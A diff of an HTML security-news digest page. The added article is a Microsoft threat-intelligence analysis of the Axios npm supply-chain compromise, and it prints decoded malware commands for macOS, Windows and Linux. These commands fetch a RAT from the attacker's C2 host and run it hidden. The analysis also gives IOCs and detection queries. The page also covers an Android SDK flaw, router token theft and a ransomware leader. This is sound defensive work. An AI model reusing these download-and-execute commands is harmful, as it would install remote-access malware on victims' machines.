-Due to the URI_ALLOW_UNSAFE flag, the intent URI may include the following flags;
-- FLAG_GRANT_PERSISTABLE_URI_PERMISSION
-- FLAG_GRANT_READ_URI_PERMISSION
-- FLAG_GRANT_WRITE_URI_PERMISSION
-When combined, these flags grant persistent read and write access to the app’s private data.
-After the vulnerable app processes the intent and applies these flags, the malicious app is authorized to interact with the target app’s content provider. This authorization remains active until the target app explicitly revokes it [5]. As a result, the internal directories of the vulnerable app are exposed, which allows unauthorized access to sensitive data in its private storage space. The following image illustrates an example of an exploitation intent:
-Affected applications
-A significant number of apps using this SDK are part of the cryptocurrency and digital‑wallet ecosystem. Because of this, the consequences of this vulnerability are especially serious. Before notifying the vendor, Microsoft confirmed the flaw in multiple apps on the Google Play Store.
-The affected wallet applications alone accounted for more than 30 million installations, and when including additional non‑wallet apps built on the same SDK, the total exposure climbed to over 50 million installations.
-Disclosure timeline
-Microsoft initially identified the vulnerability in version 4.5.4 of the EngageLab SDK. Following Coordinated Vulnerability Disclosure (CVD) practices through Microsoft Security Vulnerability Research (MSVR), the issue was reported to EngageLab in April 2025. Additionally, Microsoft notified the Android Security Team because the affected apps were distributed through the Google Play Store.
-EngageLab addressed the vulnerability in [version 5.2.1](https://mvnrepository.com/artifact/com.engagelab/engagelab/5.2.1), released on November 3, 2025. In the fixed version, the vulnerable activity is set to non-exported, which prevents it from being invoked by other apps.
-| Date | Event |
-| April 2025 | Vulnerability identified in EngageLab SDK v4.5.4. Issue reported to EngageLab |
-| May 2025 | Escalated the issue to the Android Security Team for affected applications distributed through the Google Play Store. |
-| November 3, 2025 | EngageLab released v5.2.1, addressing the vulnerability |
-Mitigation and protection guidance
-Android developers utilizing the EngageLab SDK are strongly advised to upgrade to the latest version promptly.
-Our research indicates that integrating external libraries can inadvertently introduce features or components that may compromise application security. Specifically, adding an exported component to the merged Android manifest could be unintentionally overlooked, resulting in potential attack surfaces. To keep your apps secure, always review the merged Android manifest, especially when you incorporate third‑party SDKs. This helps you identify any components or permissions that might affect your app’s security or behavior.
-Keep your users and applications secure
-Strengthening mobile‑app defenses doesn’t end with understanding this vulnerability.
-Take the next step:
-- Strengthen your defenses with
-[Microsoft Defender XDR](https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-xdr) - Accelerate investigations with
-[Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot)
-Learn more about Microsoft’s Security Vulnerability Research (MSVR) program at [https://www.microsoft.com/en-us/msrc/msvr](https://www.microsoft.com/en-us/msrc/msvr)
-References
-[1] Mayrhofer, René, Jeffrey Vander Stoep, Chad Brubaker, Dianne Hackborn, Bram Bonné, Güliz Seray Tuncay, Roger Piqueras Jover, and Michael A. Specter. The Android Platform Security Model (2023). ACM Transactions on Privacy and Security, vol. 24, no. 3, 2021, pp. 1–35. arXiv:1904.05572. [https://doi.org/10.48550/arXiv.1904.05572](https://doi.org/10.48550/arXiv.1904.05572).
-[2] [https://developer.android.com/guide/components/intents-filters](https://developer.android.com/guide/components/intents-filters)
-[3] [https://support.google.com/faqs/answer/9267555?hl=en](https://support.google.com/faqs/answer/9267555?hl=en)
-[4] [https://www.engagelab.com/docs/](https://www.engagelab.com/docs/)
-[5] [https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_PERSISTABLE_URI_PERMISSION](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_PERSISTABLE_URI_PERMISSION)
-[6] https://developer.android.com/reference/android/content/Intent#URI_ALLOW_UNSAFE
-This research is provided by Microsoft Defender Security Research with contributions from Dimitrios Valsamaras and other members of Microsoft Threat Intelligence.
-Learn more
-Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-- Evaluate your AI readiness with our latest
-[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
-[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime) - Explore
-[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
-[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection)</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
             <h2 class="article-title">Russia Hacked Routers to Steal Microsoft Office Tokens</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/russia-hacked-routers-to-steal-microsoft-office-tokens/" target="_blank">Original Link</a></p>
             <div class="content-text">Hackers linked to Russia’s military intelligence units are using known flaws in older Internet routers to mass harvest authentication tokens from Microsoft Office users, security experts warned today. The spying campaign allowed state-backed Russian hackers to quietly siphon authentication tokens from users on more than 18,000 networks without deploying any malicious software or code.
@@ -276,7 +230,20 @@ Entire hack chain requires old, outdated and in fact deprecated SOHO routers in 
 Some % of people reflexively will click ‘continue’ no matter what the rest says because they don’t understand the warnings, terms/grammar/language/importance any of it, are intimidated or are just set to click-thru inherently – same folks using 10 years defunct SOHO routers who’ve never read the words firmware nor deprecated in their happy lives as disease vectors. Mosquito spawns that ripe shouldn’t be on the internet in 2026.
 Vendors should have (mandated!) baked-in FW time bombs to FORCE updates/refurb on a 1-2 year window.
 If it dies because it’s not updated in that window, it dies. Send it in get a new one. No unattended zombies!
+I am not totally disagreeing with you, mealy, however I think you might be a wee bit heavyhanded with the scorn.
+Ok but ‘scorn’ directed at whom? It’s a business artifact built on fail paradigms.
+Internet facing products should be secured, up to date – or no internet access.
+(This is going to piss off some Libertarian hardware-is-mine types, rightfully.)
+No scorn; people who don’t know what firmware or deprecated mean as terms
+should not be put in a position of being responsible for securing their devices.
+They are not capable. That responsibility must fall on the mfr of the product
+and be enforced one way or another. If it can be fixed it must be fixed.
+Things will cost more. Not all products will make the cut. Que sera.
 Any high security environment should’ve had their endpoint devices configured to prevent users bypassing any certificate warnings. Forced DNSSEC also would’ve helped. As a last resort, appropriate user training & awareness.
+A high security environment might expect their users to have a minimum amount of commonsense around things like that (clicking through a big red flashing warning sign). But they SHOULD however be insisting on conditional access with the Oauth token bound to the device it was issued for. …….Anybody??
+ANYBODY AT ALL IN A HIGH SECURITY ENVIRONMENT……
+Crickets…and blame the user again. In 2026 that’s table stakes not an ‘addutional security feature’ Redmond – you are confusing users who know no better. Shame.
+In fairness clicking through a warning about an insecure connection – not great to be sure. But plenty of shame to go round here.
 It might get to the point where large corporations and ISPs need to start banning devices that are EOL/EOS. I don’t like it, but they seem to pose such a security risk to everyone else including themselves.
 The alternative is to force corporations who make these devices to forever provide security updates, which to me also isnt a great idea.
 But so many consumer devices and software use self signed certs, people are so used to simply clicking through.
@@ -285,7 +252,7 @@ Perhaps start requiring anything requiring a certificate to be signed using some
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Building a Detection Foundation: Part 5 - Correlation in Practice</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice" target="_blank">Original Link</a></p>
             <div class="content-text">Building a Detection Foundation: Part 5 - Correlation in Practice
@@ -519,7 +486,7 @@ I may tackle the same approach for Linux ... 🤔</div>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Germany Doxes “UNKN,” Head of RU Ransomware Gangs REvil, GandCrab</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/germany-doxes-unkn-head-of-ru-ransomware-gangs-revil-gandcrab/" target="_blank">Original Link</a></p>
             <div class="content-text">An elusive hacker who went by the handle “UNKN” and ran the early Russian ransomware groups GandCrab and REvil now has a name and a face. Authorities in Germany say 31-year-old Russian Daniil Maksimovich Shchukin headed both cybercrime gangs and helped carry out at least 130 acts of computer sabotage and extortion against victims across the country between 2019 and 2021.
@@ -553,6 +520,167 @@ You might want to watch this.
 https://media.ccc.de/v/37c3-12134-hirne_hacken_hackback_edition#t=1726
 That was more than two years ago.
 Just link to the video from 37c3 with dubbing https://media.ccc.de/v/37c3-12134-hirne_hacken_hackback_edition#l=eng&t=0</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-7" class="article-body">
+            <h2 class="article-title">Mitigating the Axios npm supply chain compromise</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/" target="_blank">Original Link</a></p>
+            <div class="content-text">On March 31, 2026, two new npm packages for updated versions of Axios, a popular HTTP client for JavaScript that simplifies making HTTP requests to a REST endpoint with over 70 million weekly downloads, were identified as malicious. These versions (1.14.1 and 0.30.4) were injected with a malicious dependency to download payloads from known actor command and control (C2). Microsoft Threat Intelligence has attributed this infrastructure and the Axios npm compromise to Sapphire Sleet, a North Korean state actor.
+Following successful connection to the malicious C2, a second-stage remote access trojan (RAT) payload was automatically deployed based on the operating system of the compromised device, including macOS, Windows, and Linux. This activity follows the pattern of recent high-profile [supply chain attacks](https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/), where other adversaries poison widely adopted open-source frameworks and their distribution channels to achieve broad downstream impact.
+Users who have installed Axios version 1.14.1 or 0.30.4 should rotate their secrets and credentials immediately and downgrade to a safe version (1.14.0 or 0.30.3). Users should also follow the [mitigation and protection guidance](#mitigation-and-protection-guidance) provided in this blog, including disabling auto-updates for Axios npm packages, since the malicious payload includes a hook that will continue to attempt to update.
+This blog shares Microsoft Threat Intelligence’s findings from our analysis, [Microsoft Defender detections](#microsoft-defender-detections) in place that alerted and protected our customers, additional protections we have implemented in our products to detect and block malicious components, and suggested mitigations for organizations to prevent further compromise.
+Analysis of the attack
+On March 31, 2026, two malicious versions of Axios npm packages were released. These packages connected to a known malicious domain (C2) owned by Sapphire Sleet to retrieve a second-stage remote access trojan (RAT). Since Axios packages are commonly auto-updated, any projects with Axios versions higher than axios@^1.14.0 or axios@^0.30.0 connected to this Sapphire Sleet C2 upon installation and downloaded second-stage malware. Windows, macOS, and Linux systems are all targeted with platform-specific payloads.
+Microsoft Threat Intelligence has determined the account that created the plain-crypto-js package is associated with Sapphire Sleet infrastructure. That account has been disabled.
+Silent install-time code execution using dependency insertion
+The updated versions of Axios inject plain-crypto-js@4.2.1, a fake runtime dependency that executes automatically through post-install with no user interaction required. The trusted package’s application logic is not modified; instead, the threat actor added a dependency that is never imported by the package’s runtime code but only exists to trigger an install-time script to download the second-stage RAT. That means normal app behavior might remain unchanged while malicious activity occurs during npm installation or npm update on developer endpoints and continuous integration and continuous delivery (CI/CD) systems.
+The dependency is seeded into a clean release (plain-crypto-js@4.2.0) to establish publishing history and reduce scrutiny. A follow‑up release adds the malicious install-time logic (plain-crypto-js@4.2.1), introducing an install hook that runs node setup.js and includes a clean manifest stub (package.md) intended for later replacement.
+Two Axios releases are then published with a surgical manifest-only change: axios@1.14.1 and axios@0.30.4 add plain-crypto-js@^4.2.1 as a dependency while leaving Axios source code unchanged. The publication metadata differs from the project’s normal CI-backed publishing pattern (for example, missing trusted publisher binding and missing corresponding repo tag/commit trail for the malicious version).
+Execution on compromised environments
+The first-stage loader (setup.js) uses layered obfuscation to reconstruct sensitive strings (module names, platform identifiers, file paths, and command templates) at runtime. A developer or CI job runs npm install axios (or a dependency install/update that resolves to the affected versions). The package manager resolves and installs the injected dependency (plain-crypto-js@4.2.1).
+During installation, the dependency’s lifecycle script automatically launches node setup.js (no additional user step required), which decodes embedded strings at runtime, identifies the platform, and connects to hxxp://sfrclak[.]com:8000/6202033 to fetch the next stage.
+Single endpoint C2 with OS-specific responses
+The package connects to a Sapphire Sleet-owned domain (hxxp://sfrclak[.]com), which fetches a second-stage payload from an actor-controlled server running on port 8000. The associated IP address (142.11.206[.]73) is tied to Hostwinds, a virtual private server (VPS) provider that Sapphire Sleet is known to commonly use when establishing C2.
+All platforms connect to the same resource over the same path (hxxp://sfrclak[.]com:8000/6202033), and the OS selection is conveyed through POST bodies packages.npm.org/product0|product1|product2. This enables the operator to serve platform-specific payloads from one route while keeping the client-side logic minimal. On Windows, the malicious npm drops a VBScript stager. On macOS, the malicious npm package drops a native binary.
+- macOS: packages.npm.org/product0
+- Windows: packages.npm.org/product1
+- Linux/other: packages.npm.org/product2
+Second-stage delivery and execution mechanics by OS
+macOS (Darwin)
+On macOS, the RAT is identified as a native binary: com.apple.act.mond.
+Setup.js writes an AppleScript into a temp location and runs it silently using nohup osascript … &. AppleScript POSTs packages.npm.org/product0 to hxxp://sfrclak[.]com:8000/6202033, downloads a binary to /Library/Caches/com.apple.act.mond, applies chmod 770, then starts it using /bin/zsh in the background.
+node setup.js └─ sh -c 'curl -o /Library/Caches/com.apple.act.mond |
+The AppleScript is removed afterward; the durable artifact is typically Library/Caches/com.apple.act.mond.
+- SHA-256: 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a
+Observed macOS command (as decoded):
+sh -c 'curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s hxxp://sfrclak[.]com:8000/6202033 && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond hxxp://sfrclak[.]com:8000/6202033 &" &> /dev/null' |
+Windows
+On Windows, the RAT is identified as a PowerShell: 6202033.ps1.
+- SHA-256: ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c
+- SHA-256: 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101
+node.exe setup.js ← npm post-install hook └─ drops: %TEMP%\6202033.vbs ← VBScript stager |
+On first execution, the PowerShell RAT creates %PROGRAMDATA%\system.bat and adds a registry run key at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate to enable re-fetching of RAT after every reboot. This added registry run key can persist after reboot.
+- SHA-256: f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd
+The chain locates PowerShell (using where powershell) then copies and renames the PowerShell into %PROGRAMDATA%\wt.exe (masquerading as a benign-looking executable name). It writes a VBScript in %TEMP% and runs it using cscript //nologo to keep user-facing windows hidden.
+The VBScript launches hidden cmd.exe to POST packages.npm.org/product1 to hxxp://sfrclak[.]com:8000/6202033, saves the response to a temp .ps1, executes it with hidden window and execution-policy bypass, then deletes the .ps1.
+The temporary .vbs is also removed; the durable artifact is often %PROGRAMDATA%\wt.exe.
+Observed Windows command (as decoded):
+"cmd.exe" /c curl -s -X POST -d "packages.npm.org/product1" "hxxp://sfrclak[.]com:8000/6202033" > "C:\Users\<user>\AppData\Local\Temp\6202033.ps1" & "C:\ProgramData\wt.exe" -w hidden -ep bypass -file "C:\Users\<user>\AppData\Local\Temp\6202033.ps1" "hxxp://sfrclak[.]com:8000/6202033" & del "C:\Users\<user>\AppData\Local\Temp\6202033.ps1" /f </user></user></user> |
+Linux/others
+On Linux, the RAT is identified as a Python payload: ld.py.
+- SHA-256: fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf
+A Python payload is written to /tmp/ld.py and launched detached using nohup python3 … &, suppressing output (> /dev/null 2>&1).
+node setup.js └─ /bin/sh -c "curl -o /tmp/ld.py |
+Setup.js executes a shell one-liner to POST packages.npm.org/product2 to hxxp://sfrclak[.]com:8000/6202033.
+The response is saved as /tmp/ld.py and executed in the background using nohup python3 /tmp/ld.py hxxp://sfrclak[.]com:8000/6202033 … &.
+/tmp/ld.py remains a key on-disk indicator in typical flows.
+Observed Linux/Unix command (as decoded):
+/bin/sh -c "curl -o /tmp/ld.py -d packages.npm.org/product2 -s hxxp://sfrclak[.]com:8000/6202033 && nohup python3 /tmp/ld.py hxxp://sfrclak[.]com:8000/6202033 > /dev/null 2>&1 &" |
+Post-execution defense evasion
+After launching the second-stage payload, the installer logic removes its own loader (setup.js) and removes the manifest (package.json) that contained the install trigger.
+It then renames package.md to package.json, leaving behind a clean-looking manifest to reduce the chance that post-incident inspection of node_modules reveals the original install hook.
+RAT deployment as covert remote management
+The Windows RAT is a PowerShell script that functions as a covert remote management component designed to persist on Windows systems and maintain continuous contact with an external command server. When executed, it generates a unique host identifier, collects detailed system and hardware information (including OS version, boot time, installed hardware, and running processes), and establishes persistence by creating a hidden startup entry that re-launches the script at user sign in under the guise of a legitimate update process.
+The RAT communicates with the remote server using periodic, encoded HTTP POST requests that blend in with benign traffic patterns, initially sending host inventory and then polling for follow‑on instructions. Supported commands allow the remote threat actor to execute arbitrary PowerShell code, enumerate files and directories across the system, inject additional binary payloads directly into memory, or terminate execution on demand. To reduce forensic visibility, the script favors in‑memory execution, temporary files, and Base64‑encoded payloads, enabling flexible control of the compromised system while minimizing on‑disk artifacts.
+Who is Sapphire Sleet?
+Sapphire Sleet is a North Korean state actor that has been active since at least March 2020. The threat actor focuses primarily on the finance sector, including cryptocurrency, venture capital, and blockchain organizations. These targets are often global, with a particular interest in the United States, as well as countries in Asia and the Middle East. The primary motivation of this actor is to steal cryptocurrency wallets to generate revenue, and target technology or intellectual property related to cryptocurrency trading and blockchain platforms.
+Sapphire Sleet often leverages social networking sites, such as LinkedIn, to initiate contact by directing users to click links, leading to malicious files hosted on attacker-controlled cloud storage services such as OneDrive or Google Drive, using domains masquerading as financial institutions like United States-based banks or cryptocurrency pages, and fraudulent meeting links that impersonate legitimate video conferencing applications, such as Zoom. Sapphire Sleet overlaps with activity tracked by other security vendors as UNC1069, STARDUST CHOLLIMA, Alluring Pisces, BlueNoroff, CageyChameleon, or CryptoCore.
+Mitigation and protection guidance
+In organizations where the security posture of npm packages might require review of updates prior to deployment, disabling auto-upgrade features is strongly encouraged. In package.json, remove use of caret (^) or tilde (~) which allow auto-upgrade of any minor or patch update up to a major version. Instead, use an exact version and handle upgrades manually.
+What to do now if you’re affected
+For organizations affected by this attack, Microsoft Threat Intelligence recommends the following steps:
+- Roll back all deployments of Axios to safe versions (1.14.0 or 0.30.3 or earlier).
+- Use overrides to force pinned versions for transitive dependencies.
+- Flush the local cache with “npm cache clean –force“.
+- Disable or restrict automated dependency bots for critical packages.
+- Adopt Trusted Publishing with OIDC to eliminate stored credentials.
+- Review your CI/CD pipeline logs for any npm install executions that might have updated to axios@1.14.1 or axios@0.30.4 or presence of plain-crypto-js in your npm install / npm ci outputs.
+- Look for outbound connections in network egress traffic to sfrclak[.]com or 142.11.206[.]72 on port 8000.
+- Developer machines: Search home directory for any node_modules folder containing plain-crypto-js or axios@1.14.1 or axios@0.30.4.
+- Rotate all secrets and credentials that are exposed to compromised systems.
+- When possible, ignore postinstall scripts. If the scenario allows, use “npm ci –ignore-scripts” to prevent postinstall hooks from running or disable postinstall scripts by default with “npm config set ignore-scripts true”.
+- Remove all Axios files/code from the victim systems and re-install cleanly.
+Defending against the Axios supply chain attack
+Microsoft Threat Intelligence recommends the following mitigation measures to protect organizations against this threat.
+- Fully stop Axios from being upgraded unless you explicitly choose to upgrade – In package.json, remove ^ or ~ (which allows auto-upgrade of any minor or patch update) and use an exact version. NOTE: With this change, versions never upgrade unless you change them manually:
+{ "dependencies": { "axios": "1.14.0" } } `` |
+- Block Axios upgrades even if a transitive dependency tries – If Axios appears indirectly, force a version using overrides (npm ≥ 14). This forces all dependencies to use the pinned version, which is especially useful for security incidents. NOTE: With this change, versions never upgrade unless you change them manually:
+{ "overrides": { "axios": "1.14.0" } } `` |
+- Disable automated dependency bots (such as Dependabot or Renovate) by disabling or restricting Axios updates in their config to prevent PR‑based auto‑updates, which are often mistaken for npm behavior:
+# Dependabot example ignore: - dependency-name: "axios" |
+- Check for malicious Axios versions in the organization to ensure that workflows and systems don’t use compromised Axios versions (1.14.1 and 0.30.4).
+- Assess the potential blast radius from affected endpoints
+- The Exposure Management graph provides a unified representation of organizational assets and their relationships, including identities, endpoints, cloud resources and secrets. This graph is also exposed to customers through Advanced Hunting in Microsoft Defender, enabling programmatic exploration of these connections.
+- Using advanced hunting, security teams can query this graph to assess the potential blast radius of any given node, such as a server affected by the RAT. By understanding which assets are reachable through existing permissions and trust relationships, organizations can prioritize remediation of the most critical exposure paths.
+- Additional examples and query patterns are available here as well as in the hunting queries section.
+Microsoft Defender detections
+[Microsoft Defender](https://www.microsoft.com/security/business/microsoft-defender) customers can refer to the list of applicable detections below. Durable detections that were already in place alerted and protected customers from this attack. We have also released additional protections to detect and block specific malicious components.
+Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.
+| Tactic | Observed activity | Microsoft Defender coverage (Blocking detections are indicated where applicable and mapped to specific IoCs, components, or TTPs.) |
+| Initial Access, Execution | The postinstall script downloads the payload from the attacker-controlled server. | Microsoft Defender for Cloud – Malicious Axios supply chain activity detected |
+| Initial execution script was included in setup.js – plain-crypto-js-4.2.1.tgz and is responsible for launching the malicious chain during install or first run | Microsoft Defender for Endpoint – Trojan:Script/SuspObfusRAT.A (Blocking) | |
+| Initial execution script setup.js was responsible for launching the malicious chain during install or first run | Microsoft Defender for Endpoint – TrojanDownloader:JS/Crosdomd.A (Blocking) | |
+| Maliciously packaged crypto library plain-crypto-js@4.2.1 used to execute or support attacker‑controlled logic in a supply‑chain compromise. | Microsoft Defender for Endpoint – Trojan:JS/AxioRAT.DA!MTB (Blocking) | |
+| Execution (macOS) | macOS persistence artifact /Library/Caches/com.apple.act.mond launched, masquerading as a legitimate Apple component to maintain stealthy execution. | Microsoft Defender for Endpoint – Trojan:MacOS/Multiverze!rfn (Blocking) – Backdoor:MacOS/TalonStrike.A!dha (Blocking) – Backdoor:MacOS/Crosdomd.A (Blocking) – Behavior:MacOS/SuspNukeSpedExec.B (Blocking) – Behavior:MacOS/SuspiciousActivityGen.AE (Blocking) |
+| Download and execution of payload | Microsoft Defender for Endpoint – Trojan:Script/SuspObfusRAT.A (Blocking) – Trojan:JS/AxioRAT.DA!MTB (Blocking) – Trojan:MacOS/Multiverze!rfn (Blocking) – Behavior:MacOS/SuspNukeSpedExec.B – Behavior:MacOS/SuspiciousActivityGen.AE – Process launched in the background – Suspicious AppleScript activity – Suspicious script launched – Suspicious shell command execution – Suspicious file or content ingress – Executable permission added to file or directory – Suspicious file dropped and launched | |
+| Execution (Linux) | Download and execution of payload, /tmp/ld.py, a Python loader/downloader used to fetch, decrypt, or launch additional malicious components. | Microsoft Defender for Endpoint – Trojan:Python/TalonStrike.C!dha (Blocking) – Backdoor:Python/TalonStrike.C!dha (Blocking) |
+| Download and execution of payload | Microsoft Defender for Endpoint – Trojan:Python/TalonStrike.C!dha (Blocking) – Process launched in the background – Suspicious communication with a remote target | |
+| Execution (Windows) | Observed artifacts, 6202033.ps1 and system.bat, provided attackers persistent remote access, command execution, and follow‑on payload delivery on Windows system | Microsoft Defender for Endpoint – TrojanDownloader:PowerShell/Powdow.VUE!MTB (Blocking) – Trojan:Win32/Malgent (Blocking) – TrojanDownloader:PowerShell/Crosdomd.B (Blocking) – TrojanDownloader:PowerShell/Crosdomd.A (Blocking) – TrojanDownloader:BAT/TalonStrike.F!dha (Blocking) – Backdoor:PowerShell/TalonStrike.B!dha (Blocking) |
+| Download and execution of payload, 6202033.ps1. | Microsoft Defender for Endpoint – TrojanDownloader:PowerShell/Powdow.VUE!MTB (Blocking) – Trojan:Win32/Malgent (Blocking) – Behavior:Win32/PSMasquerade.A – Suspicious ASEP via registry key – System executable renamed and launched – Possible initial access from an emerging threat | |
+| Defense evasion (macOS) | Removal of indicators | Microsoft Defender for Endpoint – Suspicious path deletion |
+| Command and control | Use of the following network indicators for C2 communications: C2 domain: sfrclak[.]com C2 IP: 142.11.206[.]73 C2 URL: hxxp://sfrclak[.]com:8000/6202033 | Microsoft Defender for Endpoint network protection and Microsoft Defender SmartScreen block malicious network indicators observed in the attack. |
+Indicators of compromise
+| Indicator | Type | Description |
+Sfrclak[.]com | C2 domain | Resolves to 142.11.206[.]73. Registrar: NameCheap, Inc |
+142.11.206[.]73 | C2 IP | Sapphire Sleet C2 IP. Port 8000, HTTP |
+hxxp://sfrclak[.]com:8000/6202033 | C2 URL | Static path across all variants |
+%TEMP%\6202033.vbs | Windows VBScript dropper | Created by node setup.js |
+%TEMP%\6202033.ps1 | Windows PowerShell payload | Downloaded from C2, self-deleting SHA-256: ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c SHA-256: 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101 |
+%PROGRAMDATA%\system.bat
+| File created by PowerShell | SHA-256: f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd |
+C:\ProgramData\wt.exe | Windows LOLBin | Windows Terminal copy, used as PowerShell proxy |
+/Library/Caches/com.apple.act.mond | macOS binary | SHA-256: 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a |
+/tmp/ld.py | Linux loader | SHA-256: fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf |
+packages.npm.org/product1 | npm identifier (Windows) | Sent as POST body to C2 |
+packages.npm.org/product0 | npm identifier (macOS) | Sent as POST body to C2 |
+Hunting queries
+Microsoft Defender XDR
+Microsoft Defender XDR customers can run the following [advanced hunting](https://learn.microsoft.com/defender-xdr/advanced-hunting-overview) queries to find related activity in their networks:
+Installed Node.js packages with malicious versions
+DeviceTvmSoftwareInventory | where (SoftwareName has "axios" and SoftwareVersion in ("1.14.1.0", "0.30.4.0")) or (SoftwareName has "plain-crypto-js" and SoftwareVersion == "4.2.1.0") |
+Detect the RAT dropper and subsequent download and execution
+CloudProcessEvents | where ProcessCurrentWorkingDirectory endswith '/node_modules/plain-crypto-js' and (ProcessCommandLine has_all ('plain-crypto-js','node setup.js')) or ProcessCommandLine has_all ('/tmp/ld.py','sfrclak.com:8000') |
+Connection to known C2
+DeviceNetworkEvents | where Timestamp > ago(2d) | where RemoteUrl contains "sfrclak.com" | where RemotePort == "8000" |
+Curl execution to download the backdoor
+DeviceProcessEvents | where Timestamp > ago(2d) | where (FileName =~ "cmd.exe" and ProcessCommandLine has_all ("curl -s -X POST -d", "packages.npm.org", "-w hidden -ep", ".ps1", "& del", ":8000")) or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "nohup", ".py", ":8000/", "> /dev/null 2>&1") and ProcessCommandLine contains "python") or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "com.apple.act.mond", "http://",":8000/", "&> /dev/null")) |
+Microsoft Sentinel
+Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the [Microsoft Sentinel Content Hub](https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy) to have the analytics rule deployed in their Sentinel workspace.
+The following queries use [Sentinel Advanced Security Information Model (ASIM) functions](https://learn.microsoft.com/azure/sentinel/normalization) to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces [from GitHub](https://aka.ms/DeployASIM), using an ARM template or manually.
+Detect network IP and domain indicators of compromise using ASIM
+The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser.
+//IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic(['142.11.206.73']); let ioc_domains = dynamic(["http://sfrclak.com:8000", "http://sfrclak.com"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor |
+Detect Web Sessions IP and domain indicators of compromise using ASIM
+The following query checks IP addresses, domains, and file hash IOCs across data sources supported by ASIM web session parser.
+//IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic(['142.11.206.73']); _Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor // Domain list - _Im_WebSession let ioc_domains = dynamic(["http://sfrclak.com:8000", "http://sfrclak.com"]); _Im_WebSession (url_has_any = ioc_domains) |
+Microsoft Defender for Cloud
+Possibly compromised packages
+Microsoft Defender for Cloud customers can use [cloud security explorer](https://learn.microsoft.com/azure/defender-for-cloud/how-to-manage-cloud-security-explorer) to surface possibly compromised software packages. The following screenshot represents a query that searches for container images with the axios or plain-crypto-js node packages.
+Threat intelligence reports
